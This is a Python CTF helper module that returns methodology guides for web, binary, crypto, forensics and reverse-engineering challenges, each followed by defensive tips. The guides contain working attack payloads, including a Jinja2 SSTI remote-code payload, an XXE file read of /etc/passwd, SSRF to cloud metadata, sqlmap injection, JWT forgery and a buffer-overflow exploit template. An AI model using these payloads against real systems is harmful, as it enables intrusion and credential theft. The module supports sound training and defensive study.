"""
ERR0RS-Ultimate | CTF Solver Module
Interactive Capture The Flag assistant — guided tool chains for Web, Pwn, Crypto, Forensics, Rev.
Teaches methodology, not just commands. Purple team lens: offense + defense on every technique.
"""

CTF_BANNER = """
╔══════════════════════════════════════════════════════════╗
║         🚩  ERR0RS CTF Solver Mode  🚩                   ║
║   Web · Pwn · Crypto · Forensics · Reversing             ║
╚══════════════════════════════════════════════════════════╝
"""

# ─────────────────────────────────────────────
#  WEB EXPLOITATION
# ─────────────────────────────────────────────

WEB_GUIDE = """
═══════════════════════════════════════
  WEB EXPLOITATION — CTF METHODOLOGY
═══════════════════════════════════════

[STEP 1] Recon & Enumeration
  gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt
  gobuster dir -u http://TARGET -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -x php,txt,html,bak
  nikto -h http://TARGET
  whatweb http://TARGET

[STEP 2] Identify Tech Stack
  • Check response headers (Server, X-Powered-By)
  • View page source for framework hints
  • Check /robots.txt, /sitemap.xml, /.git/, /backup/

[STEP 3] SQL Injection
  sqlmap -u "http://TARGET/page?id=1" --dbs --batch
  sqlmap -u "http://TARGET/page?id=1" -D dbname --tables --batch
  sqlmap -u "http://TARGET/login" --data="user=a&pass=b" --level=5 --risk=3

[STEP 4] File Inclusion / Path Traversal
  Test: ?page=../../../../etc/passwd
  Test: ?page=php://filter/convert.base64-encode/resource=index.php
  Decode: echo "BASE64" | base64 -d

[STEP 5] SSTI (Server-Side Template Injection)
  Test payloads: {{7*7}}  ${7*7}  <%= 7*7 %>  #{7*7}
  If 49 returns: you have SSTI — identify engine (Jinja2/Twig/Freemarker)
  Jinja2 RCE: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}

[STEP 6] XXE / SSRF
  XXE: <?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
  SSRF: ?url=http://169.254.169.254/latest/meta-data/ (AWS metadata endpoint)

[STEP 7] JWT Attacks
  jwt_tool TOKEN -T          (tamper menu)
  jwt_tool TOKEN -X a        (alg:none attack)
  jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt  (crack secret)

[DEFEND] WAF rules, parameterized queries, CSP headers, output encoding,
         disable directory listing, secrets in env vars not source code.
"""

# ─────────────────────────────────────────────
#  BINARY EXPLOITATION (PWN)
# ─────────────────────────────────────────────

PWN_GUIDE = """
═══════════════════════════════════════
  BINARY EXPLOITATION — CTF METHODOLOGY
═══════════════════════════════════════

[STEP 1] Initial Triage
  file ./binary          — architecture, stripped/not stripped
  checksec ./binary      — NX, ASLR, PIE, stack canary, RELRO
  strings ./binary | grep -i flag
  ltrace ./binary        — library call trace
  strace ./binary        — syscall trace

[STEP 2] Static Analysis
  ghidra / binary ninja / ida  — decompile main()
  objdump -d ./binary | less   — disassemble
  readelf -a ./binary          — sections, symbols

[STEP 3] Buffer Overflow
  Generate pattern:   python3 -c "import pwn; pwn.cyclic(200)"
  Find offset:        python3 -c "import pwn; print(pwn.cyclic_find(0x6161616c))"
  Basic 64-bit BOF template (pwntools):
    from pwn import *
    p = process('./binary')
    offset = 72
    ret = 0x401016      # ret gadget for stack alignment
    win = 0x401234      # win() function address
    payload = b'A' * offset + p64(ret) + p64(win)
    p.sendline(payload)
    p.interactive()

[STEP 4] ROP Chains
  ROPgadget --binary ./binary --rop       — find gadgets
  ropper -f ./binary                      — alternative gadget finder
  pwntools ROP object: rop = ROP(elf)

[STEP 5] Format String Vulnerabilities
  Test: printf("%p %p %p %p %p %p")  — leak stack addresses
  Read: printf("%7$s") or printf("%7$p")
  Write: printf("%n") — write to arbitrary address

[STEP 6] Heap Exploitation
  gdb + pwndbg / peda:  heap  bins  vis_heap_chunks
  Common bugs: UAF (Use After Free), double free, heap overflow
  tcache poisoning (glibc 2.27+)

[DEFEND] Compile with -fstack-protector, -pie, -z relro -z now
         Use safe languages (Rust, Go) for new projects.
"""

# ─────────────────────────────────────────────
#  CRYPTOGRAPHY
# ─────────────────────────────────────────────

CRYPTO_GUIDE = """
═══════════════════════════════════════
  CRYPTOGRAPHY — CTF METHODOLOGY
═══════════════════════════════════════

[STEP 1] Identify the cipher
  • Long hex string?      → likely AES/block cipher, check key size
  • Base64 string?        → decode: echo "..." | base64 -d
  • Classic cipher?       → Caesar, Vigenere, ROT13 (dcode.fr)
  • RSA numbers (n,e,c)?  → RSA challenge

[STEP 2] Classic Ciphers (online tools)
  CyberChef:  https://gchq.github.io/CyberChef
  dcode.fr:   https://www.dcode.fr
  ROT13:      echo "cipher" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
  Caesar:     python3 -c "t='CIPHER'; [print(i,''.join(chr((ord(c)-65+i)%26+65) if c.isupper() else c for c in t)) for i in range(26)]"

[STEP 3] RSA Attacks
  Factor n (small primes):   factordb.com  |  msieve  |  yafu
  Low public exponent (e=3): cube root attack on small m
  Common factor attack:      two keys sharing a prime factor → gcd(n1,n2)
  RsaCtfTool: python3 RsaCtfTool.py --publickey key.pem --attack all --uncipherfile cipher.txt

[STEP 4] XOR
  key = pt ^ ct
  If key repeats: xortool cipher.bin  (auto-detect key length)
  python3: bytes([a^b for a,b in zip(ct, key)])

[STEP 5] Hash Cracking
  hashid HASH                           — identify hash type
  hashcat -m 0 hash.txt rockyou.txt     — MD5
  hashcat -m 1000 hash.txt rockyou.txt  — NTLM
  john --wordlist=rockyou.txt hash.txt  — John the Ripper
  Online: crackstation.net

[STEP 6] AES / Block Cipher Attacks
  ECB mode: identical plaintext blocks → identical ciphertext blocks (penguin attack)
  CBC bit-flip: flip byte N to corrupt block N+1 predictably
  Padding oracle: CBC-MAC attack, POODLE

[DEFEND] Use authenticated encryption (AES-GCM, ChaCha20-Poly1305).
         Never roll your own crypto. Use established libraries (libsodium).
"""

# ─────────────────────────────────────────────
#  FORENSICS
# ─────────────────────────────────────────────

FORENSICS_GUIDE = """
═══════════════════════════════════════
  DIGITAL FORENSICS — CTF METHODOLOGY
═══════════════════════════════════════

[STEP 1] File Identification
  file mystery_file              — magic bytes check
  xxd mystery_file | head -5     — raw hex header
  binwalk mystery_file           — embedded files/filesystem
  strings mystery_file | less    — human-readable strings
  exiftool mystery_file          — metadata

[STEP 2] Image Steganography
  steghide extract -sf image.jpg         — extract hidden data (may need password)
  zsteg image.png                        — LSB steg in PNG
  stegsolve (GUI)                        — bit-plane analysis
  binwalk -e image.jpg                   — extract appended files
  outguess -r image.jpg output.txt       — outguess extraction

[STEP 3] File Carving
  foremost -i disk.img -o output/        — carve files by magic bytes
  photorec disk.img                      — interactive file recovery
  scalpel disk.img -o output/            — configurable carver

[STEP 4] Network Packet Analysis (PCAP)
  wireshark capture.pcap                 — GUI analysis
  tshark -r capture.pcap -Y "http"       — filter HTTP traffic
  tshark -r capture.pcap -T fields -e http.file_data  — extract payloads
  tshark -r capture.pcap -Y "ftp-data" -T fields -e data.text  — FTP data
  NetworkMiner  — auto-extract files from PCAP

[STEP 5] Memory Forensics
  volatility3 -f memory.raw windows.info  — OS detection
  volatility3 -f memory.raw windows.pslist  — process list
  volatility3 -f memory.raw windows.cmdline — command history
  volatility3 -f memory.raw windows.filescan — file list
  volatility3 -f memory.raw windows.dumpfiles --virtaddr 0xADDR

[STEP 6] Disk Image Analysis
  fdisk -l disk.img                       — partition table
  mount -o loop,offset=512 disk.img /mnt  — mount partition
  autopsy / sleuthkit                     — GUI timeline analysis

[DEFEND] Log retention and integrity hashing. Immutable audit logs.
         Full disk encryption defeats most forensic recovery attempts.
"""

# ─────────────────────────────────────────────
#  REVERSE ENGINEERING
# ─────────────────────────────────────────────

REV_GUIDE = """
═══════════════════════════════════════
  REVERSE ENGINEERING — CTF METHODOLOGY
═══════════════════════════════════════

[STEP 1] First Looks
  file ./binary && strings ./binary | less
  ltrace ./binary  — library calls (often reveals strcmp with flag!)
  strace ./binary  — syscalls
  ./binary < /dev/null  — run with no input, observe error messages

[STEP 2] Static Disassembly
  Ghidra (free, NSA):  ghidraRun  — full decompiler
  Binary Ninja:        binaryninja ./binary
  Radare2:             r2 ./binary  → aaa  → afl  → pdf @main
  objdump:             objdump -d -M intel ./binary | less

[STEP 3] Dynamic Analysis (GDB)
  gdb ./binary
  (gdb) b main          — breakpoint at main
  (gdb) r               — run
  (gdb) ni / si         — next instruction / step into
  (gdb) x/s $rdi        — examine string at RDI register
  With pwndbg: heap  context  telescope

[STEP 4] Anti-Debug Bypass
  ptrace detection: patch the ptrace call to return 0
  timing checks: step through slowly in GDB
  IsDebuggerPresent (Windows): patch to always return 0

[STEP 5] Packing / Obfuscation
  Detect packer: Detect-It-Easy (die), PEiD
  UPX: upx -d packed_binary
  Custom packer: find OEP (Original Entry Point) via x64dbg, dump with Scylla

[STEP 6] .NET / Java / Python
  .NET:   dnSpy, ILSpy (decompile to C#)
  Java:   jadx, procyon, cfr (JAR decompiler)
  Python pyc: uncompyle6 script.pyc  |  decompyle3 script.pyc

[DEFEND] Code obfuscation slows reversing but does not stop determined attackers.
         Treat client-side logic as public. Protect secrets server-side only.
"""

# ─────────────────────────────────────────────
#  MAIN DISPATCHER
# ─────────────────────────────────────────────

def run_ctf(category: str = "") -> str:
    print(CTF_BANNER)
    dispatch = {
        "web":        WEB_GUIDE,
        "pwn":        PWN_GUIDE,
        "binary":     PWN_GUIDE,
        "crypto":     CRYPTO_GUIDE,
        "cryptography": CRYPTO_GUIDE,
        "forensics":  FORENSICS_GUIDE,
        "forensic":   FORENSICS_GUIDE,
        "rev":        REV_GUIDE,
        "reversing":  REV_GUIDE,
        "re":         REV_GUIDE,
    }
    guide = dispatch.get(category.lower().strip())
    if guide:
        return guide
    # Default: full menu
    menu = "\n[CTF Solver Mode — Choose a Category]\n\n"
    menu += "  web        — Web exploitation (SQLi, SSTI, LFI, JWT, XXE, SSRF)\n"
    menu += "  pwn        — Binary exploitation (BOF, ROP, format string, heap)\n"
    menu += "  crypto     — Cryptography (RSA, XOR, AES, hash cracking, classical)\n"
    menu += "  forensics  — Digital forensics (steg, PCAP, memory, disk, carving)\n"
    menu += "  rev        — Reverse engineering (Ghidra, GDB, .NET, Java, packing)\n\n"
    menu += "  Example: 'ctf web'  |  'ctf pwn'  |  'ctf crypto'\n"
    return menu
